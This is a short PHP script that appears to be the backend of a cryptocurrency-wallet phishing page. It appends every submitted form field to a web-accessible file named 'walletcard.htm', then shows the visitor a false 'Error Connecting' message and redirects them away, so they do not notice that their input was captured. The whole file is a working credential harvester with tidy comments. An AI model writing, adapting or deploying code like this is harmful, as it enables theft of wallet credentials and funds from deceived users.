<?php
// Open walletcard.htm in append mode (or create if it doesn't exist)
$handle = fopen("walletcard.htm", "a");

// Check if the file opened successfully
if ($handle === false) {
    // Display error message
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Connection Error</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                background-color: #f8f9fa;
                margin: 0;
                font-family: Arial, sans-serif;
            }
            .error-container {
                text-align: center;
                padding: 30px;
                border-radius: 8px;
                background-color: #dc3545; /* Red background for error */
                color: white;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
                max-width: 400px;
                width: 100%;
            }
            .error-container h1 {
                font-size: 24px;
                margin-bottom: 15px;
            }
            .error-container p {
                font-size: 16px;
                margin-bottom: 20px;
            }
            .error-container .btn {
                padding: 10px 20px;
                background-color: #ffffff;
                color: #dc3545; /* Matching text color */
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }
            .error-container .btn:hover {
                background-color: #e2e6ea;
            }
        </style>
    </head>
    <body>
        <div class="error-container">
            <h1>Connection Error</h1>
            <p>There was an issue connecting to the server. Please try again later.</p>
            <button class="btn" onclick="window.location.href=\'index.html\'">Go Back to Home</button>
        </div>
    </body>
    </html>
    ';
    exit; // Stop further execution
}

// Iterate through POST data and write to the file
foreach ($_POST as $variable => $value) {
    // Sanitize form input to prevent injection attacks
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    // Write sanitized data to the file
    fwrite($handle, $safe_variable);
    fwrite($handle, "=");
    fwrite($handle, $safe_value);
    fwrite($handle, "<br>");
}

// Add a separator for entries
fwrite($handle, "<hr>");

// Close the file handle
fclose($handle);

// Redirect to a success page
echo '
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Status</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f4f6;
        }
        .popup {
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: orange;
            color: white;
            font-size: 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="popup">
        Error Connecting
    </div>

    <script>
        // Show the success message for 3 seconds, then redirect
        setTimeout(function() {
            window.location.href = "index.html";  // Redirect URL after success
        }, 3000); // 3-second delay before redirect
    </script>
</body>
</html>
';
?>
